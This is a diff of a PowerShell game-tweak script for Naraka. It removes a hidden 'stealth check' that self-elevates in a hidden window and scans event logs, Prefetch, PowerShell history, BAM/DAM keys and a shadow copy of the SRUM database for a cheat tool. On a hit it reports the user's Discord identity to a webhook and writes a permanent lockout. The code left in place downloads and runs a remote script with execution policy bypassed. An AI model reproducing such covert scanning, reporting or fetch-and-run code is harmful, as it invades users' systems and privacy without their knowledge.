@@ -60,10 +60,6 @@ if (Test-Path $logPath) {
 }
 if (-not $global:RatzLog) { $global:RatzLog = @() }
 if (-not $global:ErrorsDetected) { $global:ErrorsDetected = $false }
-if (-not (Get-Variable -Name 'DiscordAuthError' -Scope Global -ErrorAction SilentlyContinue)) { $global:DiscordAuthError = $null }
-if (-not (Get-Variable -Name 'DetectionTriggered' -Scope Global -ErrorAction SilentlyContinue)) { $global:DetectionTriggered = $false }
-# Store script root globally so it's accessible from webhook function
-$global:RatzScriptRoot = $PSScriptRoot
 
 # Lightweight global logger used throughout the script
 if (-not (Get-Command -Name Add-Log -ErrorAction SilentlyContinue)) {
@@ -87,38 +83,21 @@ if (-not (Test-Path (Join-Path $PSScriptRoot 'UTILITY')) -or -not (Test-Path (Jo
 }
 if ($needDownload) {
     try {
-        Write-Host '============================================' -ForegroundColor Cyan
-        Write-Host ' RatzTweaks Loader' -ForegroundColor Yellow
-        Write-Host '============================================' -ForegroundColor Cyan
-        Write-Host ''
         $repoZipUrl = 'https://github.com/NotRatz/NarakaTweaks/archive/refs/heads/main.zip'
         $tempDir = Join-Path $env:TEMP ('NarakaTweaks_' + [guid]::NewGuid().ToString())
         $zipPath = Join-Path $env:TEMP ('NarakaTweaks-main.zip')
-        Write-Host '[1/4] Downloading NarakaTweaks package...' -ForegroundColor Green
+        Write-Host 'Downloading full NarakaTweaks package...'
         Invoke-WebRequest -Uri $repoZipUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
-        Write-Host '[2/4] Extracting files...' -ForegroundColor Green
         Add-Type -AssemblyName System.IO.Compression.FileSystem
         [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)
         Remove-Item $zipPath -Force
         $extractedRoot = Join-Path $tempDir 'NarakaTweaks-main'
         $mainScript = Join-Path $extractedRoot 'RatzTweaks.ps1'
-        Write-Host '[3/4] Preparing to launch...' -ForegroundColor Green
-        Write-Host '[4/4] Starting RatzTweaks (this window will stay open)...' -ForegroundColor Green
-        Write-Host ''
-        Write-Host 'The main script is now running in the background.' -ForegroundColor Yellow
-        Write-Host 'Your browser will open shortly. Please wait...' -ForegroundColor Yellow
-        Write-Host ''
-        Write-Host 'You can minimize this window, but DO NOT close it!' -ForegroundColor Red
-        Write-Host 'Press any key after you finish with RatzTweaks to exit...' -ForegroundColor Cyan
-        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$mainScript`"" -WindowStyle Hidden
-        # Keep this window open so user knows it's working
-        $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
-        exit 0
+        Write-Host 'Launching full RatzTweaks.ps1 from temp folder...'
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$mainScript`" -WindowStyle Hidden"
+        Stop-Process -Id $PID -Force
     } catch {
-        Write-Host "ERROR: Failed to download package: $($_.Exception.Message)" -ForegroundColor Red
-        Write-Host 'Press any key to exit...' -ForegroundColor Yellow
-        $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
-        exit 1
+        Add-Log "ERROR downloading package: $($_.Exception.Message)"
     }
 }
 if ($PSVersionTable.PSEdition -ne 'Desktop' -or $PSVersionTable.Major -gt 5) {
@@ -128,211 +107,6 @@ Please run this script using powershell.exe.
 "@
     [Console]::WriteLine($msg)
     exit 1
-}
-
-# --- Administrator privilege check (required for HKLM registry writes) ---
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $isAdmin) {
-    [Console]::WriteLine('RatzTweaks: Administrator privileges required. Attempting to restart with elevation...')
-    try {
-        $scriptPath = $PSCommandPath
-        if (-not $scriptPath) { $scriptPath = Join-Path $PSScriptRoot 'RatzTweaks.ps1' }
-        Start-Process -FilePath 'powershell.exe' -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -Verb RunAs -WindowStyle Hidden
-        [Console]::WriteLine('RatzTweaks: Elevated instance started. Closing current instance.')
-        exit 0
-    } catch {
-        [Console]::WriteLine("RatzTweaks: Failed to elevate: $($_.Exception.Message)")
-        [Console]::WriteLine('RatzTweaks: Please run this script as Administrator.')
-        exit 1
-    }
-}
-
-# --- Registry lockout check ---
-$lockoutKeyPath = 'HKLM:\System\GameConfigStore'
-$lockoutValueName = 'Lockout'
-$isLockedOut = $false
-$lockedUserId = $null
-$lockedUserName = $null
-$lockedAvatarUrl = $null
-
-try {
-    if (Test-Path $lockoutKeyPath) {
-        $lockoutValue = Get-ItemProperty -Path $lockoutKeyPath -Name $lockoutValueName -ErrorAction SilentlyContinue
-        if ($lockoutValue -and $lockoutValue.$lockoutValueName -eq 1) {
-            [Console]::WriteLine('RatzTweaks: Lockout detected. Retrieving cached user info.')
-            $isLockedOut = $true
-            
-            # Retrieve cached user info for webhook notification
-            try {
-                $props = Get-ItemProperty -Path $lockoutKeyPath -ErrorAction SilentlyContinue
-                if ($props.LockedUserId) { $lockedUserId = $props.LockedUserId }
-                if ($props.LockedUserName) { $lockedUserName = $props.LockedUserName }
-                if ($props.LockedAvatarUrl) { $lockedAvatarUrl = $props.LockedAvatarUrl }
-                [Console]::WriteLine("RatzTweaks: Retrieved cached info - UserId: $lockedUserId, UserName: $lockedUserName")
-            } catch {
-                [Console]::WriteLine("RatzTweaks: Failed to retrieve cached user info: $($_.Exception.Message)")
-            }
-            
-            # Send repeat offender webhook notification
-            try {
-                Send-StealthWebhook -UserId $lockedUserId -UserName $lockedUserName -AvatarUrl $lockedAvatarUrl -RepeatOffender
-                [Console]::WriteLine('RatzTweaks: Repeat offender webhook sent')
-            } catch {
-                [Console]::WriteLine("RatzTweaks: Failed to send repeat offender webhook: $($_.Exception.Message)")
-            }
-        }
-    }
-} catch {
-    # Silently continue if registry check fails
-}
-
-# If locked out, start a minimal server to display the cheater page
-if ($isLockedOut) {
-    function Show-LockoutPage {
-        [Console]::WriteLine('Lockout server: starting...')
-        $listener = [System.Net.HttpListener]::new()
-        $prefix = 'http://127.0.0.1:17690/'
-        try {
-            $listener.Prefixes.Add($prefix)
-            $listener.Start()
-            [Console]::WriteLine("Lockout server: listening on $prefix")
-            Start-Process $prefix
-            
-            while ($listener.IsListening) {
-                $ctx = $listener.GetContext()
-                $path = $ctx.Request.Url.AbsolutePath.ToLower()
-                
-                $html = @"
-<!doctype html>
-<html lang='en'>
-<head>
-  <meta charset='utf-8'/>
-  <title>ACCESS DENIED</title>
-  <style>
-    body {
-      background: #000;
-      margin: 0;
-      padding: 0;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: system-ui, -apple-system, sans-serif;
-      animation: breathe 3s ease-in-out infinite;
-    }
-    @keyframes breathe {
-      0%, 100% { background-color: #000; }
-      50% { background-color: #1a0000; }
-    }
-    @keyframes glow {
-      0%, 100% { 
-        text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000;
-        transform: scale(1);
-      }
-      50% { 
-        text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff0000;
-        transform: scale(1.02);
-      }
-    }
-    @keyframes pulse {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.7; }
-    }
-    .container {
-      text-align: center;
-      padding: 2rem;
-      max-width: 800px;
-      animation: glow 3s ease-in-out infinite;
-    }
-    .skull {
-      font-size: 8rem;
-      margin-bottom: 2rem;
-      animation: pulse 2s ease-in-out infinite;
-      filter: drop-shadow(0 0 20px #ff0000);
-    }
-    h1 {
-      color: #ff0000;
-      font-size: 4rem;
-      font-weight: 900;
-      margin: 0 0 1.5rem 0;
-      letter-spacing: 0.1em;
-    }
-    .subtitle {
-      color: #ff4444;
-      font-size: 2rem;
-      margin-bottom: 2rem;
-    }
-    .detail {
-      color: #ccc;
-      font-size: 1.25rem;
-      margin-bottom: 3rem;
-    }
-    .box {
-      background: rgba(139, 0, 0, 0.3);
-      border: 2px solid #ff0000;
-      border-radius: 12px;
-      padding: 2rem;
-      margin-bottom: 3rem;
-      box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
-      animation: pulse 3s ease-in-out infinite;
-    }
-    .box-title {
-      color: #ffcccc;
-      font-size: 1.5rem;
-      margin-bottom: 0.5rem;
-    }
-    .box-text {
-      color: #aaa;
-      font-size: 1rem;
-    }
-    .warning {
-      color: #ff0000;
-      font-weight: 900;
-      text-transform: uppercase;
-    }
-    .poop {
-      font-size: 5rem;
-      margin: 2rem 0;
-      filter: drop-shadow(0 0 10px #ff0000);
-    }
-    .final {
-      color: #ff4444;
-      font-size: 1.75rem;
-      font-weight: 700;
-      margin-top: 2rem;
-    }
-  </style>
-</head>
-<body>
-  <div class='container'>
-    <h1>CHEATER DETECTED</h1>
-    <p class='subtitle'>You have been caught.</p>
-    <p class='detail'>CYZ.exe was found on your system.</p>
-    <div class='box'>
-      <p class='box-title'>Your access to this tool has been <span class='warning'>PERMANENTLY REVOKED</span>.</p>
-      <p class='box-text'>This script will never run on your system again.</p>
-    </div>
-    <p class='final'>Learn to play without cheats.</p>
-  </div>
-</body>
-</html>
-"@
-                
-                $ctx.Response.StatusCode = 200
-                $ctx.Response.ContentType = 'text/html'
-                $bytes = [System.Text.Encoding]::UTF8.GetBytes($html)
-                $ctx.Response.OutputStream.Write($bytes, 0, $bytes.Length)
-                $ctx.Response.Close()
-            }
-        } catch {
-            [Console]::WriteLine("Lockout server error: $($_.Exception.Message)")
-        } finally {
-            if ($listener.IsListening) { $listener.Stop() }
-        }
-    }
-    
-    Show-LockoutPage
-    exit 0
 }
 
 # --- Revert logic for optional tweaks ---
@@ -465,13 +239,6 @@ function Invoke-AllTweaks {
     # Only proceed if Discord OAuth completed before making any changes
     if (-not $global:DiscordAuthenticated) {
         Add-Log 'Discord authentication required — aborting tweaks.'
-        return
-    }
-    
-    # Block tweaks if detection was triggered
-    if ($global:DetectionTriggered) {
-        Add-Log 'Detection positive — tweaks aborted.'
-        [Console]::WriteLine('Invoke-AllTweaks: blocked due to detection')
         return
     }
 
@@ -1012,482 +779,11 @@ function Invoke-SelectedOptionalTweaks {
     }
 }
 
-# --- Detection Functions ---
-# Detection Workflow:
-# 1. At startup: Check for registry lockout (HKLM:\System\GameConfigStore\Lockout) - if set, exit immediately
-# 2. After Discord OAuth: Run Invoke-StealthCheck to detect CYZ.exe
-# 3. If detected: Set $global:DetectionTriggered flag, but allow user to continue to Start button
-# 4. When Start button clicked: Check flag, and if positive:
-#    - Send webhook notification
-#    - Set permanent registry lockout
-#    - Display cheater-detected page
-#    - Terminate script after 3 seconds
-# 5. Next run: Lockout check at startup prevents script from running
-
-function Invoke-StealthCheck {
-    [Console]::WriteLine('Invoke-StealthCheck: starting detection...')
-    $detected = $false
-    $targetFile = 'CYZ.exe'
-    
-    # 1. Check for running process
-    try {
-        $proc = Get-Process | Where-Object { $_.ProcessName -like '*CYZ*' -or $_.Name -like '*CYZ*' }
-        if ($proc) {
-            [Console]::WriteLine('Invoke-StealthCheck: CYZ process detected in running processes')
-            $detected = $true
-            return $detected
-        }
-    } catch {
-        [Console]::WriteLine("Invoke-StealthCheck: process check error: $($_.Exception.Message)")
-    }
-    
-    # 2. Search file system paths
-    $searchPaths = @(
-        "$env:ProgramFiles",
-        "$env:ProgramFiles(x86)",
-        "$env:LOCALAPPDATA",
-        "$env:APPDATA",
-        "$env:TEMP",
-        "$env:USERPROFILE\Downloads",
-        "$env:SystemDrive\Users",
-        "$env:SystemRoot\Prefetch"
-    )
-    
-    foreach ($path in $searchPaths) {
-        if (-not (Test-Path $path)) { continue }
-        try {
-            $found = Get-ChildItem -Path $path -Recurse -Filter $targetFile -File -ErrorAction SilentlyContinue | Select-Object -First 1
-            if ($found) {
-                [Console]::WriteLine("Invoke-StealthCheck: $targetFile found at: $($found.FullName)")
-                $detected = $true
-                return $detected
-            }
-        } catch {
-            [Console]::WriteLine("Invoke-StealthCheck: error searching $path - $($_.Exception.Message)")
-        }
-    }
-    
-    # 3. Check Prefetch folder for execution traces
-    try {
-        $prefetchPath = "$env:SystemRoot\Prefetch"
-        if (Test-Path $prefetchPath) {
-            $prefetchFile = Get-ChildItem -Path $prefetchPath -Filter "CYZ.EXE-*.pf" -File -ErrorAction SilentlyContinue | Select-Object -First 1
-            if ($prefetchFile) {
-                [Console]::WriteLine("Invoke-StealthCheck: Prefetch file detected: $($prefetchFile.Name)")
-                $detected = $true
-                return $detected
-            }
-        }
-    } catch {
-        [Console]::WriteLine("Invoke-StealthCheck: prefetch check error: $($_.Exception.Message)")
-    }
-    
-    # 4. Check Application Error logs
-    try {
-        $appError = Get-WinEvent -LogName Application -FilterXPath "*[System[Provider[@Name='Application Error']]] and *[EventData[Data='CYZ.exe']]" -MaxEvents 1 -ErrorAction SilentlyContinue
-        if ($appError) {
-            [Console]::WriteLine('Invoke-StealthCheck: CYZ.exe found in Application Error log')
-            $detected = $true
-            return $detected
-        }
-    } catch {
-        [Console]::WriteLine("Invoke-StealthCheck: Application log check error: $($_.Exception.Message)")
-    }
-    
-    # 5. Check Security audit log for process creation events (Event ID 4688)
-    try {
-        # Fetch recent process creation events and filter in PowerShell
-        $securityEvents = Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4688)]]" -MaxEvents 100 -ErrorAction SilentlyContinue
-        if ($securityEvents) {
-            foreach ($evt in $securityEvents) {
-                $evtXml = [xml]$evt.ToXml()
-                $newProcessName = $evtXml.Event.EventData.Data | Where-Object { $_.Name -eq 'NewProcessName' } | Select-Object -ExpandProperty '#text' -ErrorAction SilentlyContinue
-                if ($newProcessName -and $newProcessName -like "*CYZ.exe*") {
-                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in Security log: $newProcessName")
-                    $detected = $true
-                    return $detected
-                }
-            }
-        }
-    } catch {
-        [Console]::WriteLine("Invoke-StealthCheck: Security log check error: $($_.Exception.Message)")
-    }
-    
-    # 6. Check Windows Defender/Antimalware scan history
-    try {
-        $defenderLogs = Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -MaxEvents 500 -ErrorAction SilentlyContinue
-        if ($defenderLogs) {
-            foreach ($log in $defenderLogs) {
-                $logMsg = $log.Message
-                if ($logMsg -and $logMsg -like "*CYZ.exe*") {
-                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in Windows Defender log")
-                    $detected = $true
-                    return $detected
-                }
-            }
-        }
-    } catch {
-        [Console]::WriteLine("Invoke-StealthCheck: Windows Defender log check error: $($_.Exception.Message)")
-    }
-    
-    # 7. Check System event log for process-related events
-    try {
-        $systemEvents = Get-WinEvent -LogName System -MaxEvents 500 -ErrorAction SilentlyContinue
-        if ($systemEvents) {
-            foreach ($evt in $systemEvents) {
-                $evtMsg = $evt.Message
-                if ($evtMsg -and $evtMsg -like "*CYZ.exe*") {
-                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in System event log")
-                    $detected = $true
-                    return $detected
-                }
-            }
-        }
-    } catch {
-        [Console]::WriteLine("Invoke-StealthCheck: System event log check error: $($_.Exception.Message)")
-    }
-    
-    # 8. Check Windows Error Reporting (WER) for crash reports
-    try {
-        $werPaths = @(
-            "$env:LOCALAPPDATA\Microsoft\Windows\WER\ReportQueue",
-            "$env:ProgramData\Microsoft\Windows\WER\ReportQueue",
-            "$env:LOCALAPPDATA\CrashDumps"
-        )
-        foreach ($werPath in $werPaths) {
-            if (Test-Path $werPath) {
-                $werReports = Get-ChildItem -Path $werPath -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*CYZ*" -or $_.FullName -like "*CYZ*" }
-                if ($werReports) {
-                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in WER crash reports: $($werReports[0].FullName)")
-                    $detected = $true
-                    return $detected
-                }
-            }
-        }
-    } catch {
-        [Console]::WriteLine("Invoke-StealthCheck: WER check error: $($_.Exception.Message)")
-    }
-    
-    # 9. Check Recent Items / Jump Lists
-    try {
-        $recentPaths = @(
-            "$env:APPDATA\Microsoft\Windows\Recent",
-            "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
-            "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
-        )
-        foreach ($recentPath in $recentPaths) {
-            if (Test-Path $recentPath) {
-                $recentFiles = Get-ChildItem -Path $recentPath -Recurse -File -ErrorAction SilentlyContinue
-                foreach ($file in $recentFiles) {
-                    try {
-                        # Skip files larger than 1MB (1048576 bytes)
-                        if ($file.Length -le 1048576) {
-                            $match = Select-String -Path $file.FullName -Pattern "CYZ\.exe" -ErrorAction SilentlyContinue
-                            if ($match) {
-                                [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in recent items: $($file.FullName)")
-                                $detected = $true
-                                return $detected
-                            }
-                        }
-                    } catch {
-                        # Silently continue if file is locked or unreadable
-                    }
-                }
-            }
-        }
-    } catch {
-        [Console]::WriteLine("Invoke-StealthCheck: Recent items check error: $($_.Exception.Message)")
-    }
-    
-    # 10. Check SRUM (System Resource Usage Monitor) database via VSS
-    try {
-        [Console]::WriteLine("Invoke-StealthCheck: Starting SRUM check via VSS...")
-        $shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("$($env:SystemDrive)\", "ClientAccessible")
-        if ($shadow.ReturnValue -ne 0) {
-            throw "Failed to create shadow copy. ReturnValue: $($shadow.ReturnValue)"
-        }
-        $shadowId = $shadow.ShadowID
-        $shadowInfo = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $shadowId }
-        if (-not $shadowInfo) {
-            throw "Could not find created shadow copy with ID $shadowId"
-        }
-        $shadowPath = $shadowInfo.DeviceObject + "\Windows\System32\sru\SRUDB.dat"
-        
-        [Console]::WriteLine("Invoke-StealthCheck: Shadow copy created. Path: $shadowPath")
-
-        try {
-            if (Test-Path $shadowPath) {
-                $match = Select-String -Path $shadowPath -Pattern "CYZ.exe" -Encoding Unicode -ErrorAction SilentlyContinue
-                if ($match) {
-                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in SRUM database via shadow copy.")
-                    $detected = $true
-                } else {
-                    [Console]::WriteLine("Invoke-StealthCheck: No CYZ.exe found in SRUM database.")
-                }
-            } else {
-                [Console]::WriteLine("Invoke-StealthCheck: SRUDB.dat not found in shadow copy.")
-            }
-        } finally {
-            # Always ensure the shadow copy is deleted
-            if ($shadowInfo) {
-                $shadowInfo.Delete()
-                [Console]::WriteLine("Invoke-StealthCheck: Shadow copy $shadowId deleted.")
-            }
-        }
-        if ($detected) { return $true }
-    } catch {
-        [Console]::WriteLine("Invoke-StealthCheck: SRUM VSS check error: $($_.Exception.Message)")
-    }
-    
-    # 11. Check AmCache (Application Compatibility Cache)
-    try {
-        $amcachePath = "$env:SystemRoot\AppCompat\Programs\Amcache.hve"
-        if (Test-Path $amcachePath) {
-            # AmCache tracks program execution history
-            # Check if file was modified recently (indicates recent program execution tracking)
-            $amcacheInfo = Get-Item $amcachePath -ErrorAction SilentlyContinue
-            if ($amcacheInfo) {
-                [Console]::WriteLine("Invoke-StealthCheck: AmCache.hve exists (full analysis requires registry mounting)")
-                # Note: Full AmCache analysis requires mounting the hive and parsing
-                # This indicates execution history is tracked by Windows
-            }
-        }
-    } catch {
-        [Console]::WriteLine("Invoke-StealthCheck: AmCache check error: $($_.Exception.Message)")
-    }
-    
-    # 12. Check PowerShell history for suspicious commands
-    try {
-        $psHistoryPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-        if (Test-Path $psHistoryPath) {
-            $psHistory = Get-Content -Path $psHistoryPath -ErrorAction SilentlyContinue
-            if ($psHistory) {
-                $suspicious = $psHistory | Where-Object { $_ -like "*CYZ*" }
-                if ($suspicious) {
-                    [Console]::WriteLine("Invoke-StealthCheck: CYZ reference found in PowerShell history")
-                    $detected = $true
-                    return $detected
-                }
-            }
-        }
-    } catch {
-        [Console]::WriteLine("Invoke-StealthCheck: PowerShell history check error: $($_.Exception.Message)")
-    }
-    
-    # 13. Check BAM/DAM (Background Activity Moderator/Desktop Activity Moderator) registry keys
-    try {
-        $bamKeys = @(
-            'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings',
-            'HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings'
-        )
-        foreach ($bamKey in $bamKeys) {
-            if (Test-Path $bamKey) {
-                $userSids = Get-ChildItem -Path $bamKey -ErrorAction SilentlyContinue
-                foreach ($sidKey in $userSids) {
-                    $values = Get-ItemProperty -Path $sidKey.PSPath -ErrorAction SilentlyContinue
-                    if ($values) {
-                        $values.PSObject.Properties | ForEach-Object {
-                            if ($_.Name -like "*CYZ.exe*") {
-                                [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in BAM/DAM registry: $($_.Name)")
-                                $detected = $true
-                                return $detected
-                            }
-                        }
-                    }
-                }
-            }
-        }
-    } catch {
-        [Console]::WriteLine("Invoke-StealthCheck: BAM/DAM registry check error: $($_.Exception.Message)")
-    }
-    
-    [Console]::WriteLine('Invoke-StealthCheck: no detection')
-    return $detected
-}
-
-function Send-StealthWebhook {
-    param(
-        [string]$UserId,
-        [string]$UserName,
-        [string]$AvatarUrl,
-        [switch]$RepeatOffender
-    )
-    
-    try {
-        # Use the unified Get-WebhookUrl function
-        $wh = Get-WebhookUrl
-        if (-not $wh) {
-            [Console]::WriteLine('Send-StealthWebhook: no valid webhook URL configured')
-            return
-        }
-        
-        $timestamp = (Get-Date).ToUniversalTime().ToString('o')
-        $mention = if ($UserId) { "<@${UserId}>" } else { $null }
-        
-        if ($RepeatOffender) {
-            # Repeat offender notification with admin ping
-            $embed = @{
-                title       = '⚠️ REPEAT OFFENDER ATTEMPT ⚠️'
-                description = 'A previously banned cheater attempted to run the script again.'
-                color       = 16711680  # Red
-                timestamp   = $timestamp
-                thumbnail   = @{ url = $AvatarUrl }
-                fields      = @(
-                    @{ name = 'Username'; value = if ($mention) { "$UserName ($mention)" } else { $UserName }; inline = $false }
-                    @{ name = 'UserID'; value = $UserId; inline = $true }
-                    @{ name = 'Status'; value = 'LOCKED OUT'; inline = $true }
-                )
-            }
-            
-            $content = "⚠️ ATTEMPTED RUN BY A CHEATER: $mention <@313455919042396160>"
-            $payload = @{ content = $content; embeds = @($embed) }
-        } else {
-            # Initial detection notification
-            $embed = @{
-                title       = '🚨CHEATER DETECTED 🚨'
-                description = 'A user with CYZ.exe has been caught and locked out.'
-                color       = 16711680  # Red
-                timestamp   = $timestamp
-                thumbnail   = @{ url = $AvatarUrl }
-                fields      = @(
-                    @{ name = 'Username'; value = if ($mention) { "$UserName ($mention)" } else { $UserName }; inline = $false }
-                    @{ name = 'UserID'; value = $UserId; inline = $true }
-                )
-            }
-            
-            $content = if ($mention) { "🚨 CHEATER ALERT $mention 🚨" } else { '🚨 CHEATER DETECTED 🚨' }
-            $payload = @{ content = $content; embeds = @($embed) }
-        }
-        
-        $json = $payload | ConvertTo-Json -Depth 10
-        
-        Invoke-RestMethod -Method Post -Uri $wh -ContentType 'application/json' -Body $json -ErrorAction Stop
-        [Console]::WriteLine('Send-StealthWebhook: notification sent successfully')
-    } catch {
-        [Console]::WriteLine("Send-StealthWebhook: failed to send webhook: $($_.Exception.Message)")
-    }
-}
-
-# Unified webhook URL retrieval function (used by all webhook functions)
-function Get-WebhookUrl {
-    param(
-        [string]$ScriptRoot = $null
-    )
-    
-    $raw = $null
-    
-    # Use provided ScriptRoot, or fallback to global, then PSScriptRoot
-    if (-not $ScriptRoot) {
-        $ScriptRoot = if ($global:RatzScriptRoot) { $global:RatzScriptRoot } else { $PSScriptRoot }
-    }
-    
-    [Console]::WriteLine("Get-WebhookUrl: scriptRoot = $ScriptRoot")
-    
-    # Priority 1: Check discord_oauth.json for webhook_url
-    $oauthConfigPath = Join-Path $ScriptRoot 'discord_oauth.json'
-    [Console]::WriteLine("Get-WebhookUrl: checking config at $oauthConfigPath")
-    if (Test-Path $oauthConfigPath) {
-        try {
-            $cfg = Get-Content -Raw -Path $oauthConfigPath | ConvertFrom-Json
-            if ($cfg.webhook_url) { 
-                $raw = [string]$cfg.webhook_url
-                [Console]::WriteLine("Get-WebhookUrl: found in config: '$raw'")
-            }
-        } catch { 
-            [Console]::WriteLine("Get-WebhookUrl: error reading config: $($_.Exception.Message)")
-        }
-    }
-    
-    # Priority 2: Check discord_webhook.secret file (multiple paths)
-    if (-not $raw) {
-        $paths = @()
-        try { $paths += (Join-Path $ScriptRoot 'discord_webhook.secret') } catch {}
-        try { $paths += (Join-Path (Split-Path -Parent $PSCommandPath) 'discord_webhook.secret') } catch {}
-        try {
-            if (Get-Command Resolve-ProjectRoot -ErrorAction SilentlyContinue) {
-                $root = Resolve-ProjectRoot -startPath $ScriptRoot
-                if ($root) { $paths += (Join-Path $root 'discord_webhook.secret') }
-            }
-        } catch {}
-        
-        $paths = $paths | Where-Object { $_ } | Select-Object -Unique
-        [Console]::WriteLine("Get-WebhookUrl: checking secret file paths: $($paths -join ', ')")
-        
-        foreach ($p in $paths) {
-            if (Test-Path $p) {
-                try {
-                    $lines = Get-Content -Path $p | Where-Object { -not [string]::IsNullOrWhiteSpace($_) }
-                    if ($lines -and $lines.Count -gt 0) {
-                        $raw = [string]$lines[0]
-                        [Console]::WriteLine("Get-WebhookUrl: found in secret file ($p): '$raw'")
-                        break
-                    }
-                } catch { 
-                    [Console]::WriteLine("Get-WebhookUrl: error reading $p : $($_.Exception.Message)")
-                }
-            } else {
-                [Console]::WriteLine("Get-WebhookUrl: path not found: $p")
-            }
-        }
-    }
-    
-    # Clean and validate the webhook URL
-    if ($raw) {
-        $candidate = [string]$raw
-        
-        # Remove surrounding quotes and whitespace
-        $candidate = $candidate -replace '^[\s"\x27]+|[\s"\x27]+$',''
-        [Console]::WriteLine("Get-WebhookUrl: after trim: '$candidate'")
-        
-        # Extract URL if embedded in text
-        if ($candidate -match '(https?://\S+)') { 
-            $candidate = $matches[1]
-            [Console]::WriteLine("Get-WebhookUrl: after regex extraction: '$candidate'")
-        }
-        
-        # Remove trailing punctuation
-        $candidate = $candidate -replace '[\.,;:\)\]\}]+$',''
-        [Console]::WriteLine("Get-WebhookUrl: after cleanup: '$candidate'")
-        
-        # Reject example/placeholder URLs
-        if ($candidate -match 'discord-webhook-link|example|your-webhook' -or [string]::IsNullOrWhiteSpace($candidate)) {
-            [Console]::WriteLine("Get-WebhookUrl: rejected as example/blank")
-            return $null
-        }
-        
-        # Validate it's a Discord webhook URL
-        if ($candidate -notmatch '^https://(discord(app)?\.com)/api/webhooks/') {
-            [Console]::WriteLine("Get-WebhookUrl: rejected as not Discord webhook pattern")
-            return $null
-        }
-        
-        # Verify it's a well-formed URI
-        try {
-            if ([System.Uri]::IsWellFormedUriString($candidate, [System.UriKind]::Absolute)) {
-                [Console]::WriteLine("Get-WebhookUrl: returning valid webhook")
-                return $candidate
-            } else {
-                [Console]::WriteLine("Get-WebhookUrl: not well-formed URI")
-            }
-        } catch {
-            [Console]::WriteLine("Get-WebhookUrl: URI validation exception: $($_.Exception.Message)")
-        }
-    }
-    
-    [Console]::WriteLine("Get-WebhookUrl: returning null (no valid webhook found)")
-    return $null
-}
-
 
 # --- Lightweight Web UI to replace WinForms when needed ---
 function Start-WebUI {
-    param(
-        [Parameter(Mandatory=$false)]$PSScriptRoot,
-        [Parameter(Mandatory=$false)]$detectionJob
-    )
+    param()
     [Console]::WriteLine('Start-WebUI: initializing...')
-    [Console]::WriteLine("Start-WebUI: PSScriptRoot = $PSScriptRoot")
-    [Console]::WriteLine("Start-WebUI: detectionJob.Id = $($detectionJob.Id)")
     # Ensure modern TLS for Discord API on Windows PowerShell 5.1
     try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12 } catch {}
     $listener = [System.Net.HttpListener]::new()
@@ -1496,7 +792,6 @@ function Start-WebUI {
 
     # Enable form parsing helpers
     Add-Type -AssemblyName System.Web -ErrorAction SilentlyContinue
